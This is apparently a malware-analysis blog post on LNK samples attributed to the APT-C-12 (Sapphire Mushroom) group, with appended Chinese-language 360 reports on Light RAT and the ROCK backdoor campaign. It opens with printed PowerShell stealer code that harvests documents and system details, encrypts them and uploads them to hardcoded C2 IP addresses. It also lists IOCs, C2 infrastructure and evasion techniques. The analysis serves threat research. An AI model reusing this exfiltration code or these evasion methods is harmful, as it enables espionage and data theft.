$5 +=gci -fo " $env:systemdrive \" | ? { $_ .fullname -notlike '*:\Windows*' -and $_ .fullname -notlike '*:\Users' -and $_ .fullname -notlike '*:\Program Files*' -and $_ .fullname -notlike '*:\ProgramData' -and $_ .fullname -notlike '*:\MSOCache' -and $_ .fullname -notlike '*:\PerfLogs' -and $_ .fullname -notlike '*:\System Volume*' -and $_ .fullname -notlike '*:\Documents and Settings' -and $_ .fullname -notlike '*:\Recovery' -and $_ .fullname -notlike '*:\Boot' };
$5 = $5 | sort lastwritetime -des | % { $_ .fullname} | ? { $_ };
$e += "Search List:`r`n $5 `r`n" ;
$c = 0 ;
If ( $6 -ge 30 ){
$r = 30
Else {
$r = $6
$p = Get-Date ;
$k = 1 ;
$n = 0 ;
while ( $6 -ge $r ) {
$e += "M $k (D $c - D $r ):`r`n" ;
foreach ( $d in (( '.doc' , '.docx' , '.pdf' ),( '.ppt' , '.pptx' , '.xls' , '.xlsx' , '.wps' , '.wpp' , '.et' ),( '.txt' , '.eml' ))) {
$e += "FileType: $d `r`n" ;
foreach ( $4 in $5 ) {
Try {
gci $4 -r -fo -errora silentlycontinue | ? { $d -contains $_ .extension -and $_ .LastWriteTime -lt $p .AddDays(- 1 * $c ) -and $_ .LastWriteTime -ge $p .AddDays(- 1 * $r ) } | % { $b += 1 ; $e +=zm7 $_ $n $b $y $x ; $n = $_ .Length;
If ( $e .endswith( "OK`r`n" )) {
$y += 1
catch {
$e += "[!!! $4 search error !!!]`r`n"
$e +=( Get-Date -f yyyyMMddhhmmss)+ "`r`n" ;
$e +=( get-wmiobject win32_process -f "name='powershell.exe'" | % { $_ .commandline+ "`r`n" });
$e > " $env:tmp \$( $k )test.txt" ;
$e = " $env:tmp \$( $k )test.txt" ;
x56 $j " $env:tmp \backups\M $k .rar" $e ;
ts3 (gi -fo " $env:tmp \backups\M $k .rar" ) $x "M $k " ;
del -fo $e , " $env:tmp \backups\M $k .rar" ;
$e = '' ;
If ( $6 -le $r ) {
break
$r += 30 ;
$c += 30 ;
If ( $6 -le $r ) {
$r = $6
$k += 1
$p = 0 ;
$k = 0 ;
while ( 1 ) {
sleep -s 3500 ;
md -fo " $env:tmp \backups" ;
$x =(hostname)+ "_P" +( Get-Date -f yyyyMMddhhmmss)+ "_REDACTED" ;
$y = 1 ; $n = 0 ; $k += 1 ; $e = " $x `r`n" ;
gci " $env:appdata \Microsoft\Windows\Recent\" -fo -errora silentlycontinue | ? { $f -contains [io.path]::getextension( $_ .basename) -and $_ .LastWriteTime -ge ( Get-Date ).AddHours(- 1 ) } | % {gi (( new-object -com wscript.shell).createshortcut( $_ .fullname)).targetpath -fo -errora silentlycontinue} | % { $b += 1 ; $e +=zm7 $_ $n $b $y $x ; $n = $_ .Length;
If ( $e .endswith( "OK`r`n" )) {
$y += 1
$f = '' ;
$e +=( Get-Date -f yyyyMMddhhmmss)+ "`r`n" ;
$e > " $env:tmp \$( $k )test.txt" ;
$e = " $env:tmp \$( $k )test.txt" ;
x56 $j " $env:tmp \backups\P $k .rar" $e ;
ts3 (gi -fo " $env:tmp \backups\P $k .rar" ) $x "P $k " ;
del -fo $e , " $env:tmp \backups\P $k .rar"
[System.Net.ServicePointManager]::DefaultConnectionLimit= 50 ;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={ $true };
$s =(hostname)+ "_" +( Get-Date -f yyyyMMddhhmmss)+ "_REDACTED" ;
$m = 'http://159.65.74.97;http://159.65.127.93;http://128.199.73.43' ;
$p = $m .split( ";" );
$q = $p .length;
$l = 0 ;
$w = "" ;
while ( $l -lt $q ) {
try {
$9 =[System.Net.WebRequest]::Create( $p [ $l ]);
$w += $l .ToString();
$3 = $9 .GetResponse();
$w += " OK`r`n"
catch {
$w += " BAD!`r`n"
$l += 1
$w +=( Get-Date -f yyyyMMddhhmmss)+ "`r`n" ;
$w += "systeminfo:`r`n" +(systeminfo)+ "`r`n" ;
$w += "ipconfig /all:`r`n" +(ipconfig /all)+ "`r`n" ;
$w += "netstat -a:`r`n" +(netstat -a)+ "`r`n" ;
$w += "arp -a:`r`n" +(arp -a)+ "`r`n" ;
$w += "desktop files:`r`n" +(ls -r $home \desktop)+ "`r`n" ; $w += "tmp files:`r`n" +(ls $env:tmp \..\)+ "`r`n" ; $w += "pw cmd:`r`n" +( get-wmiobject win32_process -f "name='powershell.exe'" | % { $_ .commandline+ "`r`n" });
$w += "programfiles:`r`n" +(ls $env:programfiles )+ "`r`n" ;
$w += "programfiles x86:`r`n" +(ls ${env:programfiles(x86)})+ "`r`n" ;
$w +=( Get-Date -f yyyyMMddhhmmss)+ "`r`n" ;
$w | out-file " $env:tmp \start.log" -Encoding UTF8;
$3 =-join([char[]]( 48 .. 57 + 65 .. 90 + 97 .. 122 ) | get-random -c 16 );
$7 = new-object security.cryptography.rsacryptoserviceprovider( 2048 );
$7 .fromxmlstring( " 4RKDLymbgSDghM7HHxZprfPfWcoBQDCL156NPOAsDRiLZ57zj8kcqjq/zgGFAuyhmfmaFBCRz75NIN33Ze105pNzOZXAO975/IpS4xNimVA7vmeEEAF7JQ+W3JMNnzXM5Tx1aMyiaSVY3k+07H45hPEiAJx07f/f94EDwTBNkhL3RN1B30+B75d/6sjn+T4u3bkZEx88LLwRQEQf/wO3Ey0OaH1i04prS6HC6R63XRPNCBYWUzDcTFYLidwqNBfBzwMRsPIoLdmav4BOdVNIubPhCINzT6FcaFyYB9kHsDXEM8o+Tou9eNhIBE1koJ9qjhGBFi+s20Sj3qE4mv8kpw== AQAB " );
$7 .encrypt([text.encoding]::utf8.getbytes( " $3 " ), $False ) > " $env:tmp \id" ;
iex ( "& ' $env:AppData \WinRAR\Rar.exe' a -ep1 -y ' $env:tmp \id.rar' ' $env:tmp \id'" )| out-null ;
while (!(ts3 (gi " $env:tmp \id.rar" ) $s 'id' )){sleep -s 180 }x56 $3 " $env:tmp \start.rar" " $env:tmp \start.log" ;
ts3 (gi " $env:tmp \start.rar" ) $s 'start' ;
del -fo " $env:tmp \id" , " $env:tmp \id.rar" , " $env:tmp \start.rar" , " $env:tmp \start.log" ;
sr2 $3 $s
The PowerShell scripts do vary between the samples, but maintain the same key features. Some have blocks of Base64 to obfuscate the calling of the DLL, while others have this code in the clear. Additionally, the PowerShell script passed as a parameter with the DLL does vary slightly.
But at a very high level, the PowerShell extracts out more data from the LNK file, expands that data into a temporary location, loads a malicious dll (with a further PowerShell script as a parameter), obtain user information and data, and encrypts it before sending it back to a C2 server. The 360 TIC report examines this code in depth.
To me, however, what stood out was a string which I have redacted 2 appended to the collected data, which could refer to a username or social media handle to identify the origin of returned data.
Looking at the other LNK samples more of these handle-type names were identified. Of these I was able to identify a social media account for at least two of these type of strings in the samples:
Summary of all the key IOCs from the PowerShell identifies possible handles and C2 infrastructure:
Identifying String SHA 256 Hash IP Addresses Storage Server User Agent Other
String 1 20ad6fa72982a6ba0f9499361b2aa3a3
f5cca73fd397c2969d08a4c5f2866814 159.65.127.93
139.59.238.1
138.197.142.236 0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36 Embedded Base64 to execute DLL
String 2 b0d7118d75c0f2a99fa5b319148b8914
8800e5db06ee403d6a31c451a8a54f2b 139.59.226.29
188.226.144.42
139.59.230.181 0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36 Embedded Base64 to execute DLL
String 3 70b6961af57bce72b89103197c8897a4
ae3ce5fdb835ccd050f24acbac52900d 159.65.74.97
159.65.127.93
128.199.73.43
05012.ams3.digitaloceanspaces.com Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36
String 1 ea6e7c9b9110c7c21062908be51dd3f8
81490b40b9b77a534fdc7812ab5cd2af 159.65.127.93
139.59.238.1
138.197.142.236 0123.nyc3.digitaloceanspaces.com Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36 Embedded Base64 to execute DLL
String 4 6ccad83fb9f7a50ac95e3e865a27be0
288279e76fcd3b5af495c6fcf6d58fa36 178.128.110.214
198.211.118.118
138.197.135.170
59.73.16.165
N/A Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36 Using FTP server rather than Digital Ocean
Hey Taxi!! Cab!!
The PowerShell further extracted a CAB file that contained further files: PDFs, DOCXs, DOCs, and JPEGs along with a DLL with a non-standard extension (e.g. .g ), and a legitimate copy of rar.exe . The dropped files ( sans the .dll, see below) are:
String of Interest # LNK File Name Dropped Files Translated Dropped Files SHA256 Hashes
String 1 陈婧简历+作品.lnk 《互联网发展：信息与动态》7月刊原稿.docx
《中国工商报》官方微博作品.docx
陈婧+13957937111+简历.doc "Internet Development: Information and Development" July Issue.docx
"China Business News" official Weibo works.docx
Chen Jing + 13957937111 + resume.doc ca1aea9710219b68fe30b964a526dc82efa08d9032959efd252f7197af1deb21
1a7c9ac35f4c89fe4906ee1c512c2fc5306d8d97d7ab44cc7726475923a311f1
fac0bfb2aedea0fde6e4f239cbfd4de9d8db55e6041cf3f62956b2dc50620506
String 2 周文重：2018博鳌亚洲论坛感谢函.lnk 周文重：2018博鳌亚洲论坛感谢函.doc Zhou Wenzhong: Thank you letter for Boao Forum for Asia 2018.doc 32b3c6920eb5fcd8bddf55154e6e17453a4f07919216e7df6d84fb3f57a64966
String 3 【2018前海合作论坛】.lnk 附件1-2018前海合作论坛方案.pdf
附件2-参会回执.docx
附件3-深圳市前海香港商会简介.pdf2018前海合作论坛邀请函.pdf Annex 1-2018 Qianhai Cooperation Forum Program.pdf
Annex 2-Participation Receipt.docx
Attachment-3-Brief introduction of Shenzhen Qianhai Hong Kong Chamber of Commerce.pdf
2018 Qianhai Cooperation Forum Invitation Letter.pdf 94aa26bac896f65cfebbb76efa9b7009c658e01e2d52d2da338483c3fb5f3188
52384bf0f4e694eb030a31f82b74e4fdcb261e11ede4fefa3cc5f2782bdd370b
f600c66bc52c84698fb52a1f12d2f50fbe3b64754b226e8adb65f0b44a831dc8
091880728698db599e2b577d629d3bc6c9a9b40370f3ce0b9943cee8cbf20302
String 1 《政法网络舆情》会员申请.lnk 《政法网络舆情》会员征集函.doc
婺城分局祝您鸡年行大运-1.jpg
婺城分局祝您鸡年行大运-2.jpg
婺城分局祝您鸡年行大运-3.jpg
婺城分局祝您鸡年行大运-4.jpg
婺城分局祝您鸡年行大运-5.jpg
婺城分局祝您鸡年行大运-6.jpg "Politics and Law Network Public Opinion" Membership Letter.doc
Tancheng Branch wishes you a good luck in the Year of the Rooster-1.jpg
Tancheng Branch wishes you a good luck in the Year of the Rooster-2.jpg
Tancheng Branch wishes you a good luck in the Year of the Rooster-3.jpg
Tancheng Branch wishes you a good luck in the Year of the Rooster-4.jpg
Tancheng Branch wishes you a good luck in the Year of the Rooster-5.jpg
Tancheng Branch wishes you a good luck in the Year of the Rooster-6.jpg ab0b6e3a24a4b9f102a58b8536f68ddd560e8b42c16652b9db388ef981bbf165
f6ca0e0bb33163143867bb496f53a6f329a927c06af0c0ddc9506d3c3fd3d335
6fb39753349dd8811270be863b61d0d42120c3452b8b09964e3e6c1d3ab21b7b
7dc76e3c60fac07d61d6dd183624458cf982b25121bcd6a26090365b0bb089d5
8297b9d4f7f0ffb7a8fa99d5cfe93818cb23ddbd99722dbba59e58fab27a86b9
687535ba02c808d795f4893962f0d9b650cea8df40d1de80ea095befe0064b91
b787ff47b1db14409c5524e4bc5f763e3eb5cec3cf34aa553f2b41501e955737
String 4 《观察者网》采访提纲暨相关新闻附件.lnk 《观察者网》采访提纲.docx
蔡英文接受法新社专访问答全文.docx
美“友台派”议员又作妖，提“2018年台湾国际参与法案”.docx
美参议员望通过新法案 倡议加强美与亚洲多方面长期合作.docx
美议员鼓动特朗普抛弃“一中”政策与台湾“复交”,专家可能性微乎其微.docx "Observer.com" Interview Outline.docx
Tsai Ing-wen accepted the full text of the AFP interview.docx
US "Taiwanese" MPs have made a demon again, mentioning "Taiwan International Participation Act of 2018" .docx
U.S. Senators hope to pass new bill initiative to strengthen long-term cooperation between the United States and Asia.docx
U.S. lawmakers urge Trump to abandon "one China" policy and "return diplomatic relations" with Taiwan, experts are extremely unlikely.docx 0ad09b21b36ddbaa24653953181cc092400eb992aac329bde58952b96dc0aa9d
140e069093b42d9044c8ccc53cef1b3b0226248b9d7302eb64dcdf92256fa204
e53bfb8826d20be3fc043a08c733221bddc2e1ba394bef9d40144c862ccf377f
283f88c50234a4b3961384c85124c52878ab6af4801cbc0c86a3e1d779c1c48f
afe2f381bf7bcb9309db216a3f956dbf05c70da9bce9dcdcabde7ef0c46c01c9
At this stage, I haven’t done any analysis on these 20 files, except basic metadata checks. Of possible interest is the file 陈婧+13957937111+简历.doc has the email address chenjingo662@sina.com embedded as a hyperlink.
The five DLLs have similar characteristics. All are masquerading as a NVIDIA dll file with similar matadata as below:
A check of relevant hashes indicates three samples are the same, and the other two are different; however, have a recorded compilation time within 12 seconds of each other.
Identifying String DLL filename SHA 256 Hash ImpHash Compilation Time
String 4 SwYLR.T a76cb406145b1e094a8ec46ae0cf9594
95bfa4aa19ccf6b48353cc459c00005b 9442FCDB7DAAB60B53A67D5A419F71F3 compiler-stamp: Thu May 31 23:06:58 2018
debugger-stamp: Thu May 31 23:06:58 2018
String 1 lyNMk.v f9ee8f1ca51475397e2c190290c0aeb7
4a9f8a36bc0b6dfb500af7ca47d45daa 6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed Feb 07 22:04:01 2018
debugger-stamp: Wed Feb 07 22:04:01 2018
String 3 FLrzH.w 92ad7532f7b6cb5b6812da586ae9c2c6
ddf65de38aebf4067853968be20e72a2 8E02074B51513C018F9B73FEB0BEC905 compiler-stamp: Thu May 31 23:07:10 2018
debugger-stamp: Thu May 31 23:07:10 2018
String 2 hxCEm.G f9ee8f1ca51475397e2c190290c0aeb7
4a9f8a36bc0b6dfb500af7ca47d45daa 6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed Feb 07 22:04:01 2018
debugger-stamp: Wed Feb 07 22:04:01 2018
String 1 beoql.g f9ee8f1ca51475397e2c190290c0aeb7
4a9f8a36bc0b6dfb500af7ca47d45daa 6F5C40C66163B6F9E9E406E6AB83E3CC compiler-stamp: Wed Feb 07 22:04:01 2018
debugger-stamp: Wed Feb 07 22:04:01 2018
The files lyNMk.v , hxCEm.G and beoql.g with SHA256 f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa were recorded on Virus Total (35/67) with a first submission date of 2018-04-26 10:14:33 and had the recorded alternative names as nvapisetlib ,
96d9fd90e180aaf435c21334858654f6.vir (Norton AV) and beoql.g . The other two files were not recorded by that hash on Virus Total.
A rough timeline (if all the dates and times are believed):
2018-02-07: Compilation Date of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa
2018-04-26: First Submission to VT of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa
2018-05-31: Compilation Date of DLL samples 92ad7532f7b6cb5b6812da586ae9c2c6ddf65de38aebf4067853968be20e72a2 and a76cb406145b1e094a8ec46ae0cf959495bfa4aa19ccf6b48353cc459c00005b
2018-07-12: 360 TIC report
2018-10-28: Last Submission of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa to VT
2019-10-29: Submission to Hybrid-Analysis of five LNK samples
2019-10-29: Submission to Virus Total of only one LNK sample: 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d
The APT Link to the LNKs
Googling key elements of the above malware samples, led me to the abovementioned report by 360 TIC who detailed the exact campaign for only one of the files (ostensibly sample SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af). Their report is extensive, and looks at the DLL dropped and its later actions and persistence.
However, it is clear the samples were part of a campaign, and two of the files I can very tentatively associate to an online account. One identified social media account has limited use, and is linked to other accounts associated with the Hong Kong democracy movement. The second account has not been active since 2012 but posted information relating to Chinese corruption and apparent unauthorised detentions by the Chinese state.
However, there needs to be further information before any conclusion can be made as to the purpose of these strings.
If my hypothesis is correct then each malware sample was customised to include the suffix of a known identifier for the target. This likely means that the attacker did not know much about the target (i.e. end infrastructure they would potentially compromise).
Intelligence Gaps
There are significant intelligence gaps that require either deeper analysis on the samples or further external information:
Why were the samples uploaded now, and en-mass?
Are the suspicious string suffixes related to targets? Or are they used as reference to accounts controlled by the attacker? Or unrelated at all.
At least one sample is likely dated from the original 360 TIC report meaning that it was around mid-2018. What is the relationship of this sample to the others?
Conclusion
There is a bunch of further analysis to be done: including on the DLLs and the other extracted files from the malicious CAB files. This post is initially seeking to put the files out there, and share the comparisons between them.
I’ll reiterate at this time that the ‘attribution’ to the Sapphire Mushroom group is not mine, and solely based on previous reporting and the high likelihood these samples are from the same campaign.
If you have more information, questions, or analysis feel free to hit me up on Twitter or via email at matt@bitofhex.com . Thanks for reading!
All Chinese-language text has been lovingly translated by Google Translate. I apologise for any errors. ↩︎360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
蓝宝菇（APT-C-12）组织从2011年开始持续至今，长期对国内国防、政府、科研、金融等重点单位和部门进行了持续的网络间谍活动，该组织主要关注核工业和科研等相关信息。2018年7月，我们发布了《蓝宝菇-核危机行动揭秘》报告（ 点击“阅读原文”查看报告 ），在披露了该组织相关网络间谍活动之后，蓝宝菇组织的攻击频次有所下降，但未完全停歇。继而采用了针对关键目标进行短期集中攻击的闪电战策略，如18年11月针对驻外使馆、19年3月针对某科研机构等相关攻击事先都进行了周密计划，达成后快速隐匿蛰伏。
2020年初，在新冠疫情给全球格局带来新的冲击影响下，各APT组织针对国内的攻击活动异常活跃。 蓝宝菇组织也蠢蠢欲动，相关攻击活动逐渐频繁。 通过360安全大脑的遥测，我们发现该组织针对国内某重点机构的两次攻击活动中升级了技战术，开始使用云存储技术架设C2基础设施。 本报告将披露该组织最新的攻击手法和网络武器。
蓝宝菇（APT-C-12）组织在近期的攻击中针对重点目标继续沿用了主流的鱼叉邮件攻击方式，恶意荷载主要以“VBS+PowerShell”无文件攻击和Light RAT木马两种形式出现。值得注意的是蓝宝菇（APT-C-12）组织开始首次使用云存储服务形式进行命令控制。
该组织的无文件攻击方式在压缩包附件中通常会包含一个vbs脚本和PowerShell后门程序，这种攻击手法该组织最早在19年底使用过。
Light RAT是该组织未被披露的最新后门程序，使用C#语言开发
360安全大脑在9月捕获到了该组织最新的无文件攻击样本，恶意荷载是VBS+PowerShell的形式。下图为vbs脚本的文件内容,主要功能为执行同目录下的powershell后门。
Powershell后门主要负责窃取目标计算机信息和office文件信息，加密后上传到攻击者的C2服务器。
获取的信息有计算机系统信息，进程列表，ip信息，计算机名等等。 将信息数据发送到C2如下路径：
https://c2//upload//date//_threeswordsmen//start.log。
该路径中的目录被命名为threeswordsmen，该命名源自经典武侠电影“刀剑笑”(The Three Swordsmen)的英文片名，后门作者习惯使用港台电影的相关词汇命名关键代码，从侧面也暴露了后门作者的母语和地域。
使用32位随机数，利用rsa加密后，使用base64编码，并发送到C2，此动作疑似是使用产生的数据对用户计算机进行标注。
随后开始窃密用户的office类的文档信息，主要关注的文档类型有 .doc， .docx， .pdf， .ppt， .pptx， .xls ，.xlsx ，.ps1， .cpp， .eml， .js， .html， .cs。
获取文档的文件名，文件修改时间等信息后使用gzip压缩后发送到C2的如下路径 https://c2//upload//date//_threeswordsmen//Mid.cab 。
最后，窃取 %appdata%/Microsoft/Windows/Recent
目录下的文件内容，并发送至C2。
样本中的rsa public key以XML格式保存。
2020年8月，360安全大脑在蓝宝菇组织的一次攻击活动中，捕获到了该组织未被披露的最新后门程序，被攻击目标涉及国内军工产业重点单位，因木马程序中的pdb（ C:\Users\user\Desktop\Light\Light\obj\x86\Release\Light.pdb）路径，我们将其命名为Light RAT。
在我们捕获到的利用Light RAT攻击活动中，攻击者直接投递了包含Light RAT可执行文件的恶意附件，诱导目标用户点击执行。Light RAT为C#语言编写的后门程序，主要功能为窃取目标计算机信息，搜集指定特定后缀的文件传送至C2。
后门程序首先会复制office 的模板文件到指定目录，并打开相应的目录，以迷惑目标用户。
获取Recent目录下文件信息以及%Desktop%目录下指定文件后缀的文件信息，包括doc，docx，ppt，pptx，pdf，xls，xlsx后缀的文件。
在APT-C-12的两次攻击活动，均存在文件信息以及文件上传的操作，我们发现攻击者使用了开源云盘系统和云对象存储系统搭建C2基础设施，相关的云服务如下图所示。
这是蓝宝菇（APT-C-12）组织首次使用私有的云存储服务器进行命令控制，利用相关服务收集中招用户的信息、文件，以及分发恶意软件。
在相关样本代码中可以看到，其使用了各类云服务应用经常使用的对象存储方式传送文件，以PUT请求利用pre-signed URLs来进行上传操作，这样所有文件传输都伪装成了正常的云存储服务请求，在一定情况下可以躲避异常的网络流量识别。
360 高级威胁研究院
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。人面狮行动是活跃在中东地区的网络间谍活动，主要目标可能涉及到埃及和以色列等国家的不同组织，目的是窃取目标敏感数据信息。活跃时间主要集中在2014年6月到2015年11月期间，相关攻击活动最早可以追溯到2011年12月。主要采用利用社交网络进行水坑攻击，截止到目前我总共捕获到恶意代码样本314个，C&C域名7个。 人面狮样本将主程序进行伪装成文档诱导用户点击，然后释放一系列的dll，根据功能分为9个插件模块，通过注册资源管理器插件的方式来实现核心dll自启动，然后由核心dll根据配置文件进行远程dll注入，将其他功能dll模块注入的对应的进程中，所以程序运行的时候是没有主程序的。用户感染后比较难以发现，且使用多种加密方式干扰分析，根据PDB路径可以看出使用了持续集成工具，从侧面反映了项目比较庞大，开发者应该为专业的组织。 进一步我们分析推测人面狮行动的幕后组织是依托第三方组织开发相关恶意软件，使用相关恶意软件并发起相关攻击行动的幕后组织应该来自中东地区。
二、 载荷投递
1.社交网络水坑攻击
我们发现其中一个希伯来语的诱饵文档来自于Facebook以色列军队主页的评论。也就是攻击者通过利用目标所关注的社交网站帐号进行载荷投递，这是一种典型的水坑攻击方式。这与传统的水坑攻击不同，APT攻击中主流的水坑攻击主要分为以下两种： 第一种：目标关注A网站，攻击者将A网站攻陷，并植入恶意代码（一般为漏洞脚本文件，俗称挂马），当目标访问被攻陷的A网站并浏览相关页面时，当目标环境相关应用触发漏洞则有可能被植入恶意代码。 第二种：目标关注A网站，攻击者将A网站攻陷，并将A网站上一些可信应用或链接替换为攻击者所持有的恶意下载链接，当目标访问被攻陷的A网站并将恶意下载链接的文件下载并执行，则被植入恶意代码。这种攻击的典型案例是2014年公开Havex木马 [1] ，也被称作蜻蜓（Dragonfly）和活力熊（Energetic Bear）和我们在2015年5月末发布的海莲花（OceanLotus）APT组织 [2] 。 这两种水坑攻击的共性是攻击者需要获得目标所关注网站的修改权限，而本次攻击行动中攻击者完全是利用目标所关注的第三方社交网络平台进行攻击，攻击者只需简单注册，则具备留言评论等权限。 图 1 Facebook样本来源 下表是上图具体恶意下载链接和链接对应的RAR文件MD5。 RAR压缩包中诱饵文档内容为个人所得税调整，通过修改exe图标为文档来诱导用户点击。 图 2压缩包内诱饵文档截图 图 3相关C&C域名被卡巴斯基sinkhole 进一步我们发现相关攻击涉及10个社交网络帐号，具体请参看“附录A：希伯来语样本来源”，相关帐号主要涉及如：以色列国防军、以色列海军等以色列军方和政府的社交网络帐号，相关攻击评论时间主要集中在2015年1月底至2月初期间。攻击者通过在社交网络评论下发表回复诱导用户点击，回复的内容为个人所得税改革。
2.诱饵文档
根据诱饵文档的内容，也可以从体现出攻击者关注的目标领域范围，进一步主要分为以下2类：
埃及：阿拉伯语
图 4 诱饵文档1 此文档的原始文件 [3] ，文件末尾有[爱资哈尔大学反对政变的学生]的YouTube主页。 图 5 诱饵文档2 annonymous rabaa是一个攻击政府官网以抗议2013年8月Rabaa大屠杀的埃及黑客组织。
以色列 ：希伯来语
图 6 诱饵文档5 文档内容为：以色列个人税收改革。
3. 自身伪装
分为两种方式，一种伪装成文档或图片，一种伪装成安装程序，具体如下图所示： 图7 伪装文档、图片 图 8伪装成安装程序 前一种方式用户点击后并不会弹出文档或图片，后一种方式点击后安装成功然后会释放出正常的安装程序。 模块的文件属性为Office组件，早期版本安装目录为 %UserProfile%\AppData\Roaming\officeplugin，最近版本的安装目录为 C:\Program Files{GUID}，比如C:\Program Files{59f0641e-45ac-11e5-af9e-b8ca3af5855f}，伪装成系统组件。 图 9相关文件属性信息
三、ROCK后门分析
1.功能简述
人面狮攻击行动中所使用的恶意代码主要以ROCK木马为主，这类家族属于人面狮幕后组织自行开发或委托第三方订制的恶意程序。另外其中一个样本会释放远控木马，属于njRat的变种，在本章节中暂不对njRat的变种展开详细介绍。 通过将自身图标修改为文档、图片或安装程序图标，会伪装成pdf文件、图片、flash安装程序，诱导用户点击执行。 主要功能是窃取用户信息，比如系统信息、键盘和鼠标记录、skype监控、摄像头和麦克风监控、浏览器保存的账号密码，以及URL、浏览历史记录等敏感信息。收集信息后会加密并发送到指定C&C。
2.功能结构
图 10 整体结构 配置文件中存储着每个模块的配置信息，比如模块是否开启、数据文件的加密Key、用户ID（rkuid）、过期日期（未设置）、 C&C、截图和录音的质量及间隔时间，注入的进程名称等。 图 11 模块功能 Dropper总共会释放出20个dll，32位和64位各10个，每个功能模块都有32位版和64位版。
plgfsflt
对指定的文件类型进行监控并上传，文件类型包括doc、docx、ppt、pptx、xls、xlsx、odf、txt、pdf、rtf、jpg、jpeg、gif、png
模块之间跨进程通过 WM_COPYDATA消息通信，消息头Magic为0x34AB541作为唯一标识识别。消息内容均格式化为json发送。
3.通信方式
通过HTTP POST向服务器80端口发送数据，数据包中的敏感字符串通过查询json配置文件的对应表替换。 图 12 网络通信 图 13 网络通信字符串还原 由于网络通信模块注入到浏览器进程中，且使用HTTP POST向C&C的80端口发送数据，使异常流量很难被发现。
4.对抗手法
文件名随机 Dropper释放的文件，文件名来自于json文件，重命名为各种名词，比如gendarme.dll，jerques.dll。 图 14 模块文件名 字符串加密 所有的字符串都经过加密，且有多个加密算法。 图 15 字符串加密 API** 封装 大量的API（300多个）调用被封装在公共库中，干扰静态分析。 无主进程运行 核心模块作为explorer.exe的扩展启动，其他功能模块根据配置文件注入到指定进程，无主进程，所以比较难发现.即使用户发现异常，没有找到可疑进程，也会放松警惕。 行为隐藏 主模块在explorer中运行，安全软件不会拦截;通讯模块注入到浏览器进程，无浏览器进程不和CC通信;窃取文件模块注入到杀软，遍历文件的行为不容易被用户发现。 PE **资源和配置文件加密 Dropper中的PE文件经过zlib压缩和AES加密，释放出来的json配置文件也经过此方法加密。 从对抗手段来看，可见人面狮攻击行动中恶意代码开发者无论在静态还是动态对抗上面都花了大量功夫，以达到免杀和隐藏行为的效果。
四、相关线索信息
1.攻击者Facebook帐号信息
攻击者Facebook** 帐号链接**
https://www.facebook.com/rafi.partook https://www.facebook.com/people/%D7%90%D7%95%D7%94%D7%93-%D7%A4%D7%93%D7%99%D7%93%D7%94/100007696628947 https://www.facebook.com/tuti.rotam.5
C:\Users\user\bamboo-agent-home\xml-data\build-dir\ROCK-RW2-BRW6R\x64\Release-RkLibDll
ولاية سيناء-مخطط السيطرة الكامن\توجيه السيارات المفخخة ضد المباني.pdf
西奈控制方案的基本状态\重定向对建筑物的汽车炸弹.pdf
ولاية سيناء-مخطط السيطرة الكامن\هندسة المتفجرات من فلسطين.pdf
西奈控制方案的基本状态\巴勒斯坦炸药工程.pdf
从文件名可以看出，涉及埃及和以色列。
4.释放的木马
52f461a133e95328ccd9ba7f70e2f3e6（图标为Adobe pdf）样本中释放出一个远控，属于njRat的一个变种，而njRat主要流行于中东地区。
5.IP地理位置
图 16 样本和CC对应关系 其中一个样本的C&C:196.205.194.60所属国家为埃及，且此样本运行时释放的njRAT的 C&C为196.205.194.61也是埃及。
C&C IP
hxxps:// www.facebook.com/320924244852/photos/pb.320924244852.-2207520000.1449772632./10150705915184853/?type=3&theater
以色列特种部队-第13突击队
2015年1月31日下午 9:01
hxxps:// www.facebook.com/527045137305930/videos/918743024802804/
以色列国防军
2015年1月31日下午 8:33
hxxp://statuscope.co.il/%D7%9E%D7%99-%D7%94%D7%99%D7%90-%D7%94%D7%99%D7%97%D7%99%D7%93%D7%94-%D7%94%D7%98%D7%9B%D7%A0%D7%95%D7%9C%D7%95%D7%92%D7%99%D7%AA-%D7%A9%D7%9C-%D7%96%D7%A8%D7%95%D7%A2-%D7%94%D7%99%D7%9D-%D7%90%D7%A9%D7%A8-%D7%96%D7%9B%D7%AA%D7%94-%D7%91%D7%AA%D7%97%D7%A8%D7%95%D7%AA?id=c917c8e2
以色列海军
2015年2月4日 11:15:25
hxxps:// www.facebook.com/555898814436639/photos/a.556290817730772.145251.555898814436639/1019290754764107/?type=3&p=10
以色列政治评论
2015年2月2日 下午3:36
hxxps:// www.facebook.com/miri.regev.il/photos/a.538483556248464.1073741833.118410851589072/751248248305326/?type=1&theater
以色列文化和体育部长-Miri Regev
